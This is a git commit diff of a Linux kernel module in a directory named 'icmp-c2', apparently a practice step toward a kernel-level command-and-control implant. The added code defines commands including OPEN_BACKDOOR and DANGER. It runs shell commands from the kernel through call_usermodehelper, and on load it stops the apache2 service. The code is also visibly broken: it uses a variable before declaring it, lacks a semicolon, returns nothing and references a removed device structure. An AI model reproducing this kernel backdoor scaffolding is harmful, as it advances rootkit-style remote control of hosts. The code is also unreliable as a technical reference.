50c34bbe32801a2d16f8621de86dc640425a37d7
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-11-19 18:05:36 -0500

    uploading practice

--- icmp-c2/practice.c
+++ icmp-c2/practice.c
@@ -1,86 +1,49 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/init.h>
-#include <linux/fs.h>
 #include <linux/uaccess.h>
-#include <linux/pipe_fs_i.h>
 #include <linux/unistd.h>
-#include <linux/sched.h>
-#include <linux/slab.h>
-#include <linux/vfs.h>  // For vfs_unlink()
+#include <linux/string.h>
 
-// static int run_command_and_get_output(char *command) {
-//     char *argv[] = { "/bin/bash", "2>&1", "-c", command, NULL };
-//     char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-//     return 0;
-// }
+// Time to implement a custom command language in the linux kernel :)
+typedef enum COMMANDS {
+    START_SERVICE = 0,
+    STOP_SERVICE  = 1,
+    OPEN_BACKDOOR = 2,
+    DANGER        = 4
+} command_t;
 
-#include <linux/module.h>
-#include <linux/miscdevice.h>
-#include <linux/fs.h>
-#include <linux/uaccess.h>
+static int execute_and_get_status(command_t type, char *argument){
+    char *argv[] = { "/bin/bash", "-c", command, NULL };
+    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
 
-// Buffer for storing data between user space and kernel space
-#define BUFFER_SIZE 1024
-static char buffer[BUFFER_SIZE];
-static int buffer_index = 0;
-
-// File operations struct
-static ssize_t device_read(struct file *file, char __user *user_buffer, size_t len, loff_t *offset) {
-    // Check if user buffer size exceeds buffer index
-    if (*offset >= buffer_index)
-        return 0;
-
-    // Read data from kernel space buffer into user space
-    if (copy_to_user(user_buffer, buffer, buffer_index - *offset)) {
-        return -EFAULT; // Error in copying data to user space
+    char command[128] = {0};
+    int ret;
+    
+    switch(type){
+        case START_SERVICE:
+        case STOP_SERVICE:
+            snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
+            break
     }
 
-    *offset += buffer_index;
-    return buffer_index;
-}
-
-static ssize_t device_write(struct file *file, const char __user *user_buffer, size_t len, loff_t *offset) {
-    // Check if data exceeds buffer size
-    if (len > BUFFER_SIZE)
-        return -E2BIG;
-
-    // Write data from user space to kernel space buffer
-    if (copy_from_user(buffer, user_buffer, len)) {
-        return -EFAULT; // Error in copying data from user space
+    
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    if (ret != 0){
+        pr_err("Error (%d) executing command: \"%s\"\n", ret, command);
     }
-
-    buffer_index = len;
-    return len;
 }
-
-// File operations struct
-static const struct file_operations fops = {
-    .owner = THIS_MODULE,
-    .read = device_read,
-    .write = device_write,
-};
-
-// Misc device structure
-static struct miscdevice misc_dev = {
-    .minor = MISC_DYNAMIC_MINOR,
-    .name = "misc_char_device",
-    .fops = &fops,
-};
 
 static int __init misc_device_init(void) {
-    int ret = misc_register(&misc_dev);
-    if (ret) {
-        pr_err("Failed to register misc device: %d\n", ret);
-        return ret;
-    }
-    pr_info("Misc char device registered under /dev/misc_char_device\n");
+    command_t type = STOP_SERVICE;
+    char *arg_s = "apache2";
+    int status = execute_and_get_status(type, arg_s);
+    pr_info("Status: %d\n", status);
     return 0;
 }
 
 static void __exit misc_device_exit(void) {
     misc_deregister(&misc_dev);
-    pr_info("Misc char device unregistered from /dev\n");
 }
 
 module_init(misc_device_init);
